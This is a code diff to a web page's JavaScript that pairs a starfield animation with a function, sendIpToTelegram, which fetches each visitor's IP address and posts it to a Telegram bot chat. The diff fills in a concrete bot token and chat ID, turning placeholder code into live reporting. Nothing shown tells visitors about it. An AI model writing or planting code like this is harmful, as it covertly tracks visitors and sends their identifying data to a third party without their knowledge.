@@ -5,8 +5,8 @@ async function sendIpToTelegram() {
         const data = await res.json();
         const ip = data.ip;
 
-        const BOT_TOKEN = "YOUR_BOT_TOKEN";   // ⚠️ exposed in frontend
-        const CHAT_ID = "YOUR_CHAT_ID";
+        const BOT_TOKEN = "5564814493";   // ⚠️ exposed in frontend
+        const CHAT_ID = "-1001756381397";
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
@@ -153,3 +153,4 @@ function drawStars() {
     requestAnimationFrame(drawStars);
 }
 drawStars();
+
